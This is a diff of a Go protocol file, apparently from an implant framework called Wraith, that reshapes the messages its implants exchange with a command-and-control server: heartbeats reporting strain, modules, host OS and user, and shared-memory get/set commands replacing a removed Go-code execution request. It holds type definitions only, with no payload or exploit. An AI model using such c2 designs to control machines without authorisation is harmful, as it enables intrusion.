@@ -3,8 +3,8 @@ package proto
 import "time"
 
 // The structure of heartbeats which Wraiths send to c2 to register
-// their status and presence.
-type PacketRegReq struct {
+// their existence.
+type PacketHeartbeatReq struct {
 	// A unique fingerprint of the family/strain this Wraith belongs to.
 	StrainId string
 
@@ -13,10 +13,6 @@ type PacketRegReq struct {
 
 	// A list of the names of modules installed in this Wraith.
 	Modules []string
-
-	// A list of the names of symbols avilable within this Wraith's
-	// Go interpreter environment (only those passed to AdditionalSymbols).
-	Symbols []string
 
 	// The operating system Wraith is running on.
 	HostOS string
@@ -34,17 +30,27 @@ type PacketRegReq struct {
 	HostUserId string
 }
 
-type PacketRegRes struct {
-	// A JWT to identify this Wraith.
-	Token string
+type PacketExchangeReq struct {
+	// Wraith SHM commands to be executed.
+	Set     map[string]any
+	Get     []string
+	Watch   []string
+	Unwatch []struct {
+		CellName string
+		WatchId  int
+	}
+	Dump  bool
+	Prune bool
+	Init  bool
 }
 
-type PacketCmdReq struct {
-	// Go code to be executed.
-	Exec []byte
-}
-
-type PacketCmdRes struct {
-	// Result of the executed code.
-	Result []byte
+type PacketExchangeRes struct {
+	// Result of the executed SHM commands.
+	Set     []string       // The cells that have been updated.
+	Get     map[string]any // The contents of the requested cells mapped to their names.
+	Watch   map[string]int // The WatchIds of the cells that are watched because of this command, mapped to the cell names.
+	Unwatch []string       // The cell names of the cells that have been unwatched.
+	Dump    map[string]any // The full contents of the memory (if requested).
+	Prune   int            // How many cells have been pruned.
+	Init    error          // Whether the SHM has been successfully reinitialised.
 }
